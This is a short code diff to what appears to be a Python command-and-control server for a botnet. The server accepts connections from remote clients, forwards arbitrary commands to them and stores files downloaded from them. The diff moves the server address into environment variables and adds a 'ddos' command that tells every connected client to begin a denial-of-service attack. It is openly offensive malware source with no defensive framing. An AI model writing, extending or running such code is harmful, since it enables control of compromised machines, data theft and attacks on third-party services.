@@ -4,10 +4,11 @@ import uuid
 import json
 import queue
 import os
+from dotenv import load_dotenv
 from C2Server import OUTPUT_DIR, DOWNLOAD_DIR
 
-ip_address = '10.0.2.2'
-port_number = 50000
+ip_address = os.environ.get("SERVERIP")
+port_number = int(os.environ.get("SERVERPORT"))
 
 THREADS = {}
 IPS = {}
@@ -22,7 +23,7 @@ def init_server():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((ip_address, port_number))
     print(f"Server started on {ip_address}:{port_number}...")
-    server_socket.listen(5)
+    server_socket.listen(10)
     while True:
         try : 
             client_socket, client_address = server_socket.accept()
@@ -86,6 +87,9 @@ def handle_connection(client_socket, client_address, thread_uuid):
                 f.write(response)
             response = f"Downloaded {filename} to downloads/{filename}"
 
+        elif command.split(" ")[0] == "ddos":
+            client_socket.send(command.encode())
+            response = "DDoS attack started"
         else:
             client_socket.send(command.encode())
             response = client_socket.recv(1024).decode()
